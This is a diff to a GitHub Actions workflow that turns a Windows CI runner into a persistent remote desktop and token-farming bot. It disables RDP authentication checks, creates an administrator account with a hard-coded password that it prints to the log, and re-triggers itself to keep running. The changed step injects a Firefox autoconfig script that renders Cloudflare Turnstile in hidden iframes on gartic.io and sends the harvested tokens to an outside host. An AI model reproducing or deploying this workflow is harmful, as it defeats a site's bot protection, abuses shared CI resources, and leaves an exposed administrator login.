@@ -24,18 +24,19 @@ jobs:
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
           netsh advfirewall firewall add rule name="Allow-RDP" dir=in action=allow protocol=TCP localport=3389
 
-      - name: 2. Inject Gartic Script (Auto-Inject Core)
+      - name: 2. Inject Gartic Script (Direct Method)
         run: |
           $firefoxDir = "C:\Program Files\Mozilla Firefox"
           if (!(Test-Path "$firefoxDir\defaults\pref")) { New-Item -ItemType Directory -Force -Path "$firefoxDir\defaults\pref" }
+          
+          # إعدادات التفعيل
           $pref = 'pref("general.config.filename", "mozilla.cfg");' + "`n" + 'pref("general.config.obscure_value", 0);'
           $pref | Out-File "$firefoxDir\defaults\pref\local-settings.js" -Encoding ASCII -Force
 
-          # السكربت مشفر Base64 لفتح صفحتين والعمل تلقائياً
-          $b64 = "dHJ5IHsgd2luZG93LmFkZEV2ZW50TGlzdGVuZXIoJ2xvYWQnLCBmdW5jdGlvbigpIHsgaWYgKGxvY2F0aW9uLmhyZWYuaW5jbHVkZXMoJ2dhcnRpYy5pbycpKSB7IHNldEludGVydmFsKGZ1bmN0aW9uKCkgeyBsb2NhdGlvbi5yZWxvYWQoKTsgfSwgNTAwMDApOyBmdW5jdGlvbiBzZW5kVG9rZW4odCkgeyBpZiAodHlwZW9mIHQgIT09ICdzdHJpbmcnIHx8IHQubGVuZ3RoIDw9IDIwKSByZXR1cm47IGZldGNoKCdodHRwczovL3d3dy54c3cud29yay5nZC9hZGQtdG9rZW4nLCB7IG1ldGhvZDogJ1BPU1QnLCBoZWFkZXJzOiB7ICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicgfSwgYm9keTogSlNPTi5zdHJpbmdpZnkoeyB0b2tlbjogdCB9KSB9KS5jYXRjaChmdW5jdGlvbigpIHt9KTsgfSB3aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcignbWVzc2FnZScsIGZ1bmN0aW9uKGUpIHsgaWY (euZGF0YSAmJiB0eXBlb2YgZS5kYXRhID09PSAnc3RyaW5nJykgeyBzZW5kVG9rZW4oZS5kYXRhKTsgfSB9KTsgZm9yICh2YXIgaSA9IDA7IGkgPCA2OyBpKyspIHsgdmFyIGYgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpZnJhbWUnKTsgZi5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOyBmLnNhbmRib3ggPSAnYWxsb3ctc2NyaXB0cyBhbGxvdy1zYW1lLW9yaWdpbic7IGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoZik7IGYuc3JjZG9jID0gJzwhRE9DVFlQRSBodG1sPmh0bWw+aGVhZD48c2NyaXB0IHNyYz0iaHR0cHM6Ly9jaGFsbGVuZ2VzLmNsb3VkZmxhcmUuY29tL3R1cm5zdGlsZS92MC9hcGkuanMiIGFzeW5jIGRlZmVyPjwvc2NyaXB0PjwvaGVhZD48Ym9keT48ZGl2IGlkPSJjZi10dXJud3N0aWxlIj48L2Rpdj48c2NyaXB0PmZ1bmN0aW9uIHIoKXt0cnl7d2luZG93LnR1cm5zdGlsZS5yZW5kZXIoIiNjZi10dXJud3N0aWxlIix7c2l0ZWtleToiMHg0QUFBQUFBQkJQS2FJYk53blBFZlNvIixjYWxsYmFjazpmdW5jdGlvbih0KXtwYXJlbnQucG9zdE1lc3NhZ2UodCwiKiIpO319KTt9Y2F0Y2goZSl7fX1zZXRJbnRlcnZhbChyLDM1MDApO3NldFRpbWVvdXQociwyMDApOzwvc2NyaXB0PjwvYm9keT48L2h0bWw+JzsgfSB9IH0pOyB9IGNhdGNoIChlKSB7fQ=="
-          $js = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
-          $cfg = "//" + "`n" + $js
-          $cfg | Out-File "$firefoxDir\mozilla.cfg" -Encoding ASCII -Force
+          # كتابة السكربت بطريقة هادئة بدون Base64 لتجنب أخطاء التحويل
+          $script = '//' + "`n" + 'try { window.addEventListener("load", function() { if (location.href.includes("gartic.io")) { setInterval(function() { location.reload(); }, 50000); function sendToken(t) { if (typeof t !== "string" || t.length <= 20) return; fetch("https://www.xsw.work.gd/add-token", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ token: t }) }).catch(function() {}); } window.addEventListener("message", function(e) { if (e.data && typeof e.data === "string") { sendToken(e.data); } }); for (var i = 0; i < 6; i++) { var f = document.createElement("iframe"); f.style.display = "none"; f.sandbox = "allow-scripts allow-same-origin"; document.body.appendChild(f); f.srcdoc = "<html><head><script src=''https://challenges.cloudflare.com/turnstile/v0/api.js'' async defer></script></head><body><div id=''cf-turnstile''></div><script>function r(){try{window.turnstile.render(''#cf-turnstile'',{sitekey:''0x4AAAAAABBPKaIbNwnPEfSo'',callback:function(t){parent.postMessage(t,''*'');}});}catch(e){}}setInterval(r,3500);setTimeout(r,200);</script></body></html>"; } } }); } catch (e) {}'
+          
+          $script | Out-File "$firefoxDir\mozilla.cfg" -Encoding ASCII -Force
 
       - name: 3. Create RDP User & Setup Startup
         run: |
@@ -44,13 +45,11 @@ jobs:
           New-LocalUser -Name "saif123" -Password $securePass -AccountNeverExpires -ErrorAction SilentlyContinue
           Add-LocalGroupMember -Group "Administrators" -Member "saif123"
           
-          # وضع المتصفح في قائمة بدء التشغيل ليفتح صفحتين فور دخولك
           $startupPath = "C:\Users\saif123\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
           if (!(Test-Path $startupPath)) { New-Item -ItemType Directory -Force -Path $startupPath }
           $wshell = New-Object -ComObject WScript.Shell
           $shortcut = $wshell.CreateShortcut("$startupPath\launch_bot.lnk")
           $shortcut.TargetPath = "C:\Program Files\Mozilla Firefox\firefox.exe"
-          # هنا الأمر يفتح صفحتين Gartic في تبويبات منفصلة
           $shortcut.Arguments = "-url https://gartic.io -url https://gartic.io"
           $shortcut.Save()
 
@@ -65,11 +64,8 @@ jobs:
         env:
           GH_TOKEN: ${{ github.token }}
         run: |
-          # تشغيل المتصفح بصفحتين الآن لضمان بدء العمل في الخلفية أيضاً
           Start-Process "C:\Program Files\Mozilla Firefox\firefox.exe" "-url https://gartic.io -url https://gartic.io"
-          
           $ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
           echo "::notice title=RDP INFO::IP: $ip | User: saif123 | Pass: admin@123"
-          
           Start-Sleep -Seconds 20700
           gh workflow run "ˢᵃᶤᶠ ₉₁"
